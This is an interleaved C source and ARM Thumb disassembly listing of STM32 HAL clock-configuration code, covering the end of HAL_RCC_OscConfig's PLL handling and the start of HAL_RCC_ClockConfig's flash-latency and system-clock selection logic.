 8003f4e:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003f50:	697b      	ldr	r3, [r7, #20]
 8003f52:	f003 0203 	and.w	r2, r3, #3
 8003f56:	687b      	ldr	r3, [r7, #4]
 8003f58:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8003f5a:	429a      	cmp	r2, r3
 8003f5c:	d12c      	bne.n	8003fb8 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003f5e:	697b      	ldr	r3, [r7, #20]
 8003f60:	f003 0270 	and.w	r2, r3, #112	; 0x70
 8003f64:	687b      	ldr	r3, [r7, #4]
 8003f66:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003f68:	3b01      	subs	r3, #1
 8003f6a:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003f6c:	429a      	cmp	r2, r3
 8003f6e:	d123      	bne.n	8003fb8 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003f70:	697b      	ldr	r3, [r7, #20]
 8003f72:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 8003f76:	687b      	ldr	r3, [r7, #4]
 8003f78:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8003f7a:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003f7c:	429a      	cmp	r2, r3
 8003f7e:	d11b      	bne.n	8003fb8 <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003f80:	697b      	ldr	r3, [r7, #20]
 8003f82:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
 8003f86:	687b      	ldr	r3, [r7, #4]
 8003f88:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8003f8a:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003f8c:	429a      	cmp	r2, r3
 8003f8e:	d113      	bne.n	8003fb8 <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003f90:	697b      	ldr	r3, [r7, #20]
 8003f92:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 8003f96:	687b      	ldr	r3, [r7, #4]
 8003f98:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8003f9a:	085b      	lsrs	r3, r3, #1
 8003f9c:	3b01      	subs	r3, #1
 8003f9e:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003fa0:	429a      	cmp	r2, r3
 8003fa2:	d109      	bne.n	8003fb8 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 8003fa4:	697b      	ldr	r3, [r7, #20]
 8003fa6:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 8003faa:	687b      	ldr	r3, [r7, #4]
 8003fac:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8003fae:	085b      	lsrs	r3, r3, #1
 8003fb0:	3b01      	subs	r3, #1
 8003fb2:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003fb4:	429a      	cmp	r2, r3
 8003fb6:	d06b      	beq.n	8004090 <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8003fb8:	69bb      	ldr	r3, [r7, #24]
 8003fba:	2b0c      	cmp	r3, #12
 8003fbc:	d062      	beq.n	8004084 <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 8003fbe:	4b32      	ldr	r3, [pc, #200]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003fc0:	681b      	ldr	r3, [r3, #0]
 8003fc2:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 8003fc6:	2b00      	cmp	r3, #0
 8003fc8:	d001      	beq.n	8003fce <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 8003fca:	2301      	movs	r3, #1
 8003fcc:	e0ac      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 8003fce:	4b2e      	ldr	r3, [pc, #184]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003fd0:	681b      	ldr	r3, [r3, #0]
 8003fd2:	4a2d      	ldr	r2, [pc, #180]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003fd4:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8003fd8:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003fda:	f7fd f915 	bl	8001208 <HAL_GetTick>
 8003fde:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003fe0:	e008      	b.n	8003ff4 <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003fe2:	f7fd f911 	bl	8001208 <HAL_GetTick>
 8003fe6:	4602      	mov	r2, r0
 8003fe8:	693b      	ldr	r3, [r7, #16]
 8003fea:	1ad3      	subs	r3, r2, r3
 8003fec:	2b02      	cmp	r3, #2
 8003fee:	d901      	bls.n	8003ff4 <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 8003ff0:	2303      	movs	r3, #3
 8003ff2:	e099      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003ff4:	4b24      	ldr	r3, [pc, #144]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003ff6:	681b      	ldr	r3, [r3, #0]
 8003ff8:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003ffc:	2b00      	cmp	r3, #0
 8003ffe:	d1f0      	bne.n	8003fe2 <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 8004000:	4b21      	ldr	r3, [pc, #132]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8004002:	68da      	ldr	r2, [r3, #12]
 8004004:	4b21      	ldr	r3, [pc, #132]	; (800408c <HAL_RCC_OscConfig+0x77c>)
 8004006:	4013      	ands	r3, r2
 8004008:	687a      	ldr	r2, [r7, #4]
 800400a:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 800400c:	687a      	ldr	r2, [r7, #4]
 800400e:	6b12      	ldr	r2, [r2, #48]	; 0x30
 8004010:	3a01      	subs	r2, #1
 8004012:	0112      	lsls	r2, r2, #4
 8004014:	4311      	orrs	r1, r2
 8004016:	687a      	ldr	r2, [r7, #4]
 8004018:	6b52      	ldr	r2, [r2, #52]	; 0x34
 800401a:	0212      	lsls	r2, r2, #8
 800401c:	4311      	orrs	r1, r2
 800401e:	687a      	ldr	r2, [r7, #4]
 8004020:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 8004022:	0852      	lsrs	r2, r2, #1
 8004024:	3a01      	subs	r2, #1
 8004026:	0552      	lsls	r2, r2, #21
 8004028:	4311      	orrs	r1, r2
 800402a:	687a      	ldr	r2, [r7, #4]
 800402c:	6c12      	ldr	r2, [r2, #64]	; 0x40
 800402e:	0852      	lsrs	r2, r2, #1
 8004030:	3a01      	subs	r2, #1
 8004032:	0652      	lsls	r2, r2, #25
 8004034:	4311      	orrs	r1, r2
 8004036:	687a      	ldr	r2, [r7, #4]
 8004038:	6b92      	ldr	r2, [r2, #56]	; 0x38
 800403a:	06d2      	lsls	r2, r2, #27
 800403c:	430a      	orrs	r2, r1
 800403e:	4912      	ldr	r1, [pc, #72]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8004040:	4313      	orrs	r3, r2
 8004042:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 8004044:	4b10      	ldr	r3, [pc, #64]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8004046:	681b      	ldr	r3, [r3, #0]
 8004048:	4a0f      	ldr	r2, [pc, #60]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 800404a:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800404e:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8004050:	4b0d      	ldr	r3, [pc, #52]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8004052:	68db      	ldr	r3, [r3, #12]
 8004054:	4a0c      	ldr	r2, [pc, #48]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8004056:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800405a:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 800405c:	f7fd f8d4 	bl	8001208 <HAL_GetTick>
 8004060:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004062:	e008      	b.n	8004076 <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004064:	f7fd f8d0 	bl	8001208 <HAL_GetTick>
 8004068:	4602      	mov	r2, r0
 800406a:	693b      	ldr	r3, [r7, #16]
 800406c:	1ad3      	subs	r3, r2, r3
 800406e:	2b02      	cmp	r3, #2
 8004070:	d901      	bls.n	8004076 <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 8004072:	2303      	movs	r3, #3
 8004074:	e058      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004076:	4b04      	ldr	r3, [pc, #16]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8004078:	681b      	ldr	r3, [r3, #0]
 800407a:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800407e:	2b00      	cmp	r3, #0
 8004080:	d0f0      	beq.n	8004064 <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8004082:	e050      	b.n	8004126 <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 8004084:	2301      	movs	r3, #1
 8004086:	e04f      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
 8004088:	40021000 	.word	0x40021000
 800408c:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004090:	4b27      	ldr	r3, [pc, #156]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 8004092:	681b      	ldr	r3, [r3, #0]
 8004094:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004098:	2b00      	cmp	r3, #0
 800409a:	d144      	bne.n	8004126 <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 800409c:	4b24      	ldr	r3, [pc, #144]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 800409e:	681b      	ldr	r3, [r3, #0]
 80040a0:	4a23      	ldr	r2, [pc, #140]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 80040a2:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80040a6:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 80040a8:	4b21      	ldr	r3, [pc, #132]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 80040aa:	68db      	ldr	r3, [r3, #12]
 80040ac:	4a20      	ldr	r2, [pc, #128]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 80040ae:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80040b2:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 80040b4:	f7fd f8a8 	bl	8001208 <HAL_GetTick>
 80040b8:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80040ba:	e008      	b.n	80040ce <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 80040bc:	f7fd f8a4 	bl	8001208 <HAL_GetTick>
 80040c0:	4602      	mov	r2, r0
 80040c2:	693b      	ldr	r3, [r7, #16]
 80040c4:	1ad3      	subs	r3, r2, r3
 80040c6:	2b02      	cmp	r3, #2
 80040c8:	d901      	bls.n	80040ce <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 80040ca:	2303      	movs	r3, #3
 80040cc:	e02c      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80040ce:	4b18      	ldr	r3, [pc, #96]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 80040d0:	681b      	ldr	r3, [r3, #0]
 80040d2:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80040d6:	2b00      	cmp	r3, #0
 80040d8:	d0f0      	beq.n	80040bc <HAL_RCC_OscConfig+0x7ac>
 80040da:	e024      	b.n	8004126 <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 80040dc:	69bb      	ldr	r3, [r7, #24]
 80040de:	2b0c      	cmp	r3, #12
 80040e0:	d01f      	beq.n	8004122 <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 80040e2:	4b13      	ldr	r3, [pc, #76]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 80040e4:	681b      	ldr	r3, [r3, #0]
 80040e6:	4a12      	ldr	r2, [pc, #72]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 80040e8:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 80040ec:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 80040ee:	f7fd f88b 	bl	8001208 <HAL_GetTick>
 80040f2:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 80040f4:	e008      	b.n	8004108 <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 80040f6:	f7fd f887 	bl	8001208 <HAL_GetTick>
 80040fa:	4602      	mov	r2, r0
 80040fc:	693b      	ldr	r3, [r7, #16]
 80040fe:	1ad3      	subs	r3, r2, r3
 8004100:	2b02      	cmp	r3, #2
 8004102:	d901      	bls.n	8004108 <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 8004104:	2303      	movs	r3, #3
 8004106:	e00f      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004108:	4b09      	ldr	r3, [pc, #36]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 800410a:	681b      	ldr	r3, [r3, #0]
 800410c:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004110:	2b00      	cmp	r3, #0
 8004112:	d1f0      	bne.n	80040f6 <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 8004114:	4b06      	ldr	r3, [pc, #24]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 8004116:	68da      	ldr	r2, [r3, #12]
 8004118:	4905      	ldr	r1, [pc, #20]	; (8004130 <HAL_RCC_OscConfig+0x820>)
 800411a:	4b06      	ldr	r3, [pc, #24]	; (8004134 <HAL_RCC_OscConfig+0x824>)
 800411c:	4013      	ands	r3, r2
 800411e:	60cb      	str	r3, [r1, #12]
 8004120:	e001      	b.n	8004126 <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 8004122:	2301      	movs	r3, #1
 8004124:	e000      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 8004126:	2300      	movs	r3, #0
}
 8004128:	4618      	mov	r0, r3
 800412a:	3720      	adds	r7, #32
 800412c:	46bd      	mov	sp, r7
 800412e:	bd80      	pop	{r7, pc}
 8004130:	40021000 	.word	0x40021000
 8004134:	feeefffc 	.word	0xfeeefffc

08004138 <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 8004138:	b580      	push	{r7, lr}
 800413a:	b084      	sub	sp, #16
 800413c:	af00      	add	r7, sp, #0
 800413e:	6078      	str	r0, [r7, #4]
 8004140:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 8004142:	687b      	ldr	r3, [r7, #4]
 8004144:	2b00      	cmp	r3, #0
 8004146:	d101      	bne.n	800414c <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 8004148:	2301      	movs	r3, #1
 800414a:	e0e7      	b.n	800431c <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 800414c:	4b75      	ldr	r3, [pc, #468]	; (8004324 <HAL_RCC_ClockConfig+0x1ec>)
 800414e:	681b      	ldr	r3, [r3, #0]
 8004150:	f003 0307 	and.w	r3, r3, #7
 8004154:	683a      	ldr	r2, [r7, #0]
 8004156:	429a      	cmp	r2, r3
 8004158:	d910      	bls.n	800417c <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 800415a:	4b72      	ldr	r3, [pc, #456]	; (8004324 <HAL_RCC_ClockConfig+0x1ec>)
 800415c:	681b      	ldr	r3, [r3, #0]
 800415e:	f023 0207 	bic.w	r2, r3, #7
 8004162:	4970      	ldr	r1, [pc, #448]	; (8004324 <HAL_RCC_ClockConfig+0x1ec>)
 8004164:	683b      	ldr	r3, [r7, #0]
 8004166:	4313      	orrs	r3, r2
 8004168:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 800416a:	4b6e      	ldr	r3, [pc, #440]	; (8004324 <HAL_RCC_ClockConfig+0x1ec>)
 800416c:	681b      	ldr	r3, [r3, #0]
 800416e:	f003 0307 	and.w	r3, r3, #7
 8004172:	683a      	ldr	r2, [r7, #0]
 8004174:	429a      	cmp	r2, r3
 8004176:	d001      	beq.n	800417c <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 8004178:	2301      	movs	r3, #1
 800417a:	e0cf      	b.n	800431c <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 800417c:	687b      	ldr	r3, [r7, #4]
 800417e:	681b      	ldr	r3, [r3, #0]
 8004180:	f003 0302 	and.w	r3, r3, #2
 8004184:	2b00      	cmp	r3, #0
 8004186:	d010      	beq.n	80041aa <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 8004188:	687b      	ldr	r3, [r7, #4]
 800418a:	689a      	ldr	r2, [r3, #8]
 800418c:	4b66      	ldr	r3, [pc, #408]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 800418e:	689b      	ldr	r3, [r3, #8]
 8004190:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004194:	429a      	cmp	r2, r3
 8004196:	d908      	bls.n	80041aa <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8004198:	4b63      	ldr	r3, [pc, #396]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 800419a:	689b      	ldr	r3, [r3, #8]
 800419c:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80041a0:	687b      	ldr	r3, [r7, #4]
 80041a2:	689b      	ldr	r3, [r3, #8]
 80041a4:	4960      	ldr	r1, [pc, #384]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 80041a6:	4313      	orrs	r3, r2
 80041a8:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 80041aa:	687b      	ldr	r3, [r7, #4]
 80041ac:	681b      	ldr	r3, [r3, #0]
 80041ae:	f003 0301 	and.w	r3, r3, #1
 80041b2:	2b00      	cmp	r3, #0
 80041b4:	d04c      	beq.n	8004250 <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 80041b6:	687b      	ldr	r3, [r7, #4]
 80041b8:	685b      	ldr	r3, [r3, #4]
 80041ba:	2b03      	cmp	r3, #3
 80041bc:	d107      	bne.n	80041ce <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80041be:	4b5a      	ldr	r3, [pc, #360]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 80041c0:	681b      	ldr	r3, [r3, #0]
 80041c2:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80041c6:	2b00      	cmp	r3, #0
 80041c8:	d121      	bne.n	800420e <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 80041ca:	2301      	movs	r3, #1
 80041cc:	e0a6      	b.n	800431c <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 80041ce:	687b      	ldr	r3, [r7, #4]
 80041d0:	685b      	ldr	r3, [r3, #4]
 80041d2:	2b02      	cmp	r3, #2
 80041d4:	d107      	bne.n	80041e6 <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 80041d6:	4b54      	ldr	r3, [pc, #336]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 80041d8:	681b      	ldr	r3, [r3, #0]
 80041da:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80041de:	2b00      	cmp	r3, #0
 80041e0:	d115      	bne.n	800420e <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80041e2:	2301      	movs	r3, #1
 80041e4:	e09a      	b.n	800431c <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 80041e6:	687b      	ldr	r3, [r7, #4]
 80041e8:	685b      	ldr	r3, [r3, #4]
 80041ea:	2b00      	cmp	r3, #0
 80041ec:	d107      	bne.n	80041fe <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 80041ee:	4b4e      	ldr	r3, [pc, #312]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 80041f0:	681b      	ldr	r3, [r3, #0]
 80041f2:	f003 0302 	and.w	r3, r3, #2
 80041f6:	2b00      	cmp	r3, #0
 80041f8:	d109      	bne.n	800420e <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80041fa:	2301      	movs	r3, #1
 80041fc:	e08e      	b.n	800431c <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 80041fe:	4b4a      	ldr	r3, [pc, #296]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 8004200:	681b      	ldr	r3, [r3, #0]
 8004202:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004206:	2b00      	cmp	r3, #0
 8004208:	d101      	bne.n	800420e <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800420a:	2301      	movs	r3, #1
 800420c:	e086      	b.n	800431c <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 800420e:	4b46      	ldr	r3, [pc, #280]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 8004210:	689b      	ldr	r3, [r3, #8]
 8004212:	f023 0203 	bic.w	r2, r3, #3
 8004216:	687b      	ldr	r3, [r7, #4]
 8004218:	685b      	ldr	r3, [r3, #4]
 800421a:	4943      	ldr	r1, [pc, #268]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 800421c:	4313      	orrs	r3, r2
 800421e:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004220:	f7fc fff2 	bl	8001208 <HAL_GetTick>
 8004224:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 8004226:	e00a      	b.n	800423e <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 8004228:	f7fc ffee 	bl	8001208 <HAL_GetTick>
 800422c:	4602      	mov	r2, r0
 800422e:	68fb      	ldr	r3, [r7, #12]
 8004230:	1ad3      	subs	r3, r2, r3
